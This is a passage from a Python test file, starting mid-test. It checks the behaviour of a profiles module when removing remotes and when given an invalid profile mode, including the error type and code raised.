    assert profiles.remove_remote(tmp_path, "lab") is False
    assert profiles.list_remotes(tmp_path) == []


def test_profile_error_is_both_domain_and_value_error(tmp_path):
    error = None
    try:
        profiles.profile_root(tmp_path, "bogus")
    except ValueError as exc:
        error = exc
    assert isinstance(error, DomainError)
    assert isinstance(error, ValueError)
    assert error.code == "invalid_mode"
